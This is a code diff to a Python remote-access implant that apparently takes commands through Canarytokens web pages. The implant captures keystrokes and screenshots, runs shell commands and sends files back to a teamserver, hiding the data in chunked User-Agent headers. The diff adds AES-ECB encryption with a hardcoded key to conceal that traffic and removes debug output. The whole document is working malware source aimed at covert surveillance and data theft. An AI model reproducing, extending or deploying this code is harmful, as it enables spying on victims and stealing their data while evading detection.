@@ -10,7 +10,6 @@ import sys
 import threading
 import time
 from datetime import datetime
-
 import requests
 import win32gui
 from PIL import Image
@@ -18,8 +17,9 @@ from bs4 import BeautifulSoup
 import mss
 import mss.tools
 from pynput.keyboard import Controller, Listener
+from Cryptodome.Util.Padding import pad, unpad
+from Cryptodome.Cipher import AES
 
-# !/usr/bin/env python3
 keyboard = Controller()
 
 # Globals
@@ -32,7 +32,38 @@ canaryEndpoint = ["index.html", "contact.php", "post.jsp", "submit.aspx"]
 keys = ""
 klogging = False
 lastActiveWindow = ""
+encrypted = True
 
+# Will add random key option for generated payloads later. I am focusing on the basic implementation first so that's why it's hardcoded
+key = b'dRgUkXp2s5u8x/A?D(G+KbPeShVmYq3t'
+BLOCK_SIZE = 32
+
+def encrypt(message):
+    if encrypted:
+        try:
+            cipher = AES.new(key, AES.MODE_ECB)
+            encrypteddata = cipher.encrypt(pad(message,BLOCK_SIZE))
+            encrypteddataunhex = encrypteddata.hex()
+            return (encrypteddataunhex)
+
+        except Exception as e:
+            pass
+    else:
+        return message
+
+
+def decrypt(encrypteddata):
+    if encrypted:
+        try:
+            encrypteddata = bytes.fromhex(encrypteddata)
+            decipher = AES.new(key, AES.MODE_ECB)
+            msg_dec = decipher.decrypt(encrypteddata)
+            return unpad(msg_dec, BLOCK_SIZE)
+
+        except Exception as e:
+            pass
+    else:
+        return encrypteddata
 
 def on_press(key):
     if klogging:
@@ -89,7 +120,6 @@ def connect(url, managementURL):
     try:
         cmdlist = []
         decodelist = []
-
         soup = BeautifulSoup(response.text, 'html.parser')
         data = soup.find_all("td")
 
@@ -99,7 +129,7 @@ def connect(url, managementURL):
 
         for count in cmdlist:
             try:
-                cmd = base64.b64decode(count).decode('utf-8')
+                cmd = base64.b64decode(decrypt(count)).decode('utf-8')
 
             except:
                 pass
@@ -159,18 +189,12 @@ def connect(url, managementURL):
         command = decodelist[-1]
 
     except Exception as e:
-        # print(e)
-        # exc_type, exc_obj, exc_tb = sys.exc_info()
-        # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        # print(exc_type, fname, exc_tb.tb_lineno)
         pass
 
     try:
-        # print ("[+] Command: " + command)
         if command.startswith("fallback:"):
             global canaryManagementURL
             canaryManagementURL = cmd.replace("fallback:", "")
-            # print("[+] Fallback Canarytoken Detected: ")
             main()
 
         # Adds command to #print working dir
@@ -200,7 +224,7 @@ def connect(url, managementURL):
                 monitors = sct.monitors[0]
                 filename = sct.grab(monitors)
                 # Resize image to max so that chunked requests will not be over 50 (b64 len of 343000)
-                # This will get best quality image while staying under 50 chunks
+                # This will get the best quality image while staying under 50 chunks
                 # Need to split per monitor for better quality screenshots
                 x = 1
                 while True:
@@ -208,7 +232,8 @@ def connect(url, managementURL):
                     img = img.resize((int(img.size[0] / x), int(img.size[1] / x)))
                     raw_bytes = mss.tools.to_png(img.tobytes(), img.size)
                     b64 = base64.b64encode(raw_bytes)
-                    if len(b64) < maxlen:
+                    encryptedlen = encrypt(b64)
+                    if len(encryptedlen) < maxlen:
                         break
                     else:
                         x += 1
@@ -244,53 +269,51 @@ def connect(url, managementURL):
                 time.sleep(.5)
                 output = output.decode('UTF-8').strip()
 
-            # print("Output: " + output)
             output = output.lstrip().strip()
             output = "res:" + output
             b64 = base64.b64encode(output.encode('UTF-8'))
-            # print (str(b64))
-            # print(str(len(b64)))
 
     except Exception as e:
         output = "res:Error with last ran command: " + str(e)
         b64 = base64.b64encode(output.encode('UTF-8'))
-        # exc_type, exc_obj, exc_tb = sys.exc_info()
-        # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        # print(exc_type, fname, exc_tb.tb_lineno)
         pass
 
-    # If data length is too long > 5000, split into multiple requests of 5000 chars
+
+    # If data length is too long > 7000, split into multiple requests of 7000 chars
     # Due to the transaction codes (ex. "pic:") we need to trigger below even if file/screenshot does not have to be chunked
-    if len(b64) > 7000 or sendfilewarning or screenshotwarning:
-        # print("[+] Data too long, splitting into multiple requests")
+    placeholder = encrypt(b64)
+    if len(placeholder) > 7000 or sendfilewarning or screenshotwarning:
+        b64 = placeholder
         split = [b64[i:i + 7000] for i in range(0, len(b64), 7000)]
         length = len(split)
 
+
         # If data will be sent in over 50 chunks, send warning that output cant be sent
         if len(split) >= 50:
-            # print("[-] Error, data too long to send")
+            # If output to soo large (over 50 chunks), let server know it's a nogo
             toolong = base64.b64encode("toolong:".encode('UTF-8'))
+            toolong = encrypt(toolong)
             headers = {"User-Agent": toolong,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
             response = requests.get(url, headers=headers)
-            # print("DATA TOO LONG")
             return
 
-        if screenshotwarning:
-            length = "pic:" + str(length)
+        elif screenshotwarning:
+            lengthwarn = "pic:" + str(length)
             screenshotwarning = False
 
         elif sendfilewarning:
-            length = "incomingfile:" + str(length)
+            lengthwarn = "incomingfile:" + str(length)
             sendfilewarning = False
 
         else:
-            length = "chunked:" + str(length)
+            lengthwarn = "chunked:" + str(length)
 
-        # Warning the teamserver of response
-        warining = base64.b64encode(length.encode('UTF-8'))
+        # Warning the teamserver of length
+        warining = base64.b64encode(lengthwarn.encode('UTF-8'))
+        warining = encrypt(warining)
         headers = {"User-Agent": warining,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
@@ -298,12 +321,10 @@ def connect(url, managementURL):
         response = requests.get(url, headers=headers)
 
         for i in split:
-            # print(str(i))
             headers = {"User-Agent": i,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
-            # print("[+] Sending chunked data")
             response = requests.get(url, headers=headers)
 
 
@@ -311,6 +332,7 @@ def connect(url, managementURL):
     else:
         # Send response back to canary server
         try:
+            b64 = encrypt(b64)
             headers = {"User-Agent": b64,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
@@ -321,27 +343,20 @@ def connect(url, managementURL):
                 # print("sending response")
                 response = requests.get(url, headers=headers)
 
-
         except Exception as e:
-            # print(e)
-            # exc_type, exc_obj, exc_tb = sys.exc_info()
-            # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            # print(exc_type, fname, exc_tb.tb_lineno)
             pass
 
 
 # Initial check-in for tasking
 def checkin(url):
     send = "hello"
-
     b64 = base64.b64encode(send.encode('UTF-8'))
-
+    b64 = encrypt(b64)
     headers = {
         "User-Agent": b64,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
         "Upgrade-Insecure-Requests": "1"}
-
     response = requests.get(url, headers=headers)
 
 
